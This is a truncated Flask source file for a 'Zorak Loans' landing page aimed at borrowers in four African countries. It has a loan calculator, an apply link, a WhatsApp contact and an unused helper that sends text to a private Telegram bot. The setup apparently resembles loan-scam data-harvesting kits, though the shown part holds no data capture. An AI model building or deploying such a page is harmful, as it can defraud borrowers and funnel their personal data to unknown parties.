from flask import Flask, request
import csv, os, requests
from datetime import datetime
app = Flask(__name__)
NL = chr(10)
WA = "https://wa.me/message/CFCJWLOZ7IWZK1"
BOT = os.environ.get("BOT_TOKEN")
CHAT = os.environ.get("CHAT_ID")
def send_t(text):
    if not BOT or not CHAT:
        return False
    try:
        u = "https://api.telegram.org/bot"
        u = u + BOT + "/sendMessage"
        r = requests.post(u, json={"chat_id": CHAT, "text": text}, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(e)
        return False
@app.route("/")
@app.route("/api")
def home():
    h = "<!DOCTYPE html>"
    h = h + "<html><head>"
    h = h + "<meta name='viewport'"
    h = h + " content='width=device-width,"
    h = h + " initial-scale=1'>"
    h = h + "<title>Zorak Loans</title>"
    h = h + "<style>"
    h = h + "body{margin:0;background:#eef1f5;"
    h = h + "padding:15px;font-family:Arial}"
    h = h + ".top{text-align:center;color:#0f7a55;"
    h = h + "font-size:26px;font-weight:900}"
    h = h + ".card{max-width:420px;margin:auto;"
    h = h + "background:white;border-radius:20px;"
    h = h + "padding:22px 18px}"
    h = h + ".btn{display:block;text-align:center;"
    h = h + "background:#2563eb;color:white;"
    h = h + "text-decoration:none;padding:15px;"
    h = h + "border-radius:30px;font-weight:900}"
    h = h + ".wa2{display:block;text-align:center;"
    h = h + "background:#25D366;color:white;"
    h = h + "text-decoration:none;padding:13px;"
    h = h + "border-radius:30px;font-weight:bold;"
    h = h + "margin-top:12px}"
    h = h + ".calc{background:#f8f9fb;"
    h = h + "border-radius:16px;padding:16px}"
    h = h + ".monthly{background:#eef4ff;"
    h = h + "border-radius:14px;text-align:center;"
    h = h + "padding:14px;margin-top:16px}"
    h = h + ".monthly div{color:#2563eb;"
    h = h + "font-size:30px;font-weight:900}"
    h = h + "select{width:100%;padding:12px;"
    h = h + "border-radius:10px;border:1px solid #ddd}"
    h = h + "input{width:100%}"
    h = h + "p{margin:8px 0}"
    h = h + "</style></head><body>"
    h = h + "<div class='top'>Zorak Loans</div>"
    h = h + "<div class='card'>"
    h = h + "<h2>Get Your Loan Approved Fast</h2>"
    h = h + "<p>Quick approval - Low rates</p>"
    h = h + "<div class='calc'>"
    h = h + "<p><b>Loan Calculator</b></p>"
    h = h + "<p>Country</p>"
    h = h + "<select id='country'"
    h = h + " onchange='updateAll()'>"
    h = h + "<option>Zimbabwe</option>"
    h = h + "<option>Zambia</option>"
    h = h + "<option>Tanzania</option>"
    h = h + "<option>Ghana</option>"
    h = h + "</select>"
    h = h + "<p>Amount: <b id='amtLabel'>$5,000</b></p>"
    h = h + "<input type='range' id='amount'"
    h = h + " min='100' max='5000'"
    h = h + " value='5000'"
    h = h + " oninput='updateAll()'>"
    h = h + "<p>Term: <b id='termLabel'>12 months</b></p>"
    h = h + "<input type='range' id='term'"
    h = h + " min='6' max='60' value='12'"
    h = h + " oninput='updateAll()'>"
    h = h + "<div class='monthly'>"
    h = h + "<small>Monthly Payment</small>"
    h = h + "<div id='monthly'>$434.94</div>"
    h = h + "</div></div>"
    h = h + "<p><a class='btn' href='/apply-form'"
    h = h + " id='applyBtn'>APPLY NOW</a></p>"
    h = h + "<p><a class='wa2' href='" + WA + "'>"
    h = h + "Chat on WhatsApp</a></p>"
    h = h + "<p>We never ask for PIN or OTP.</p>"
    h = h + "</div>"
    h = h + "<script>function updateAll(){"
    h = h + "var c=document.getElementById
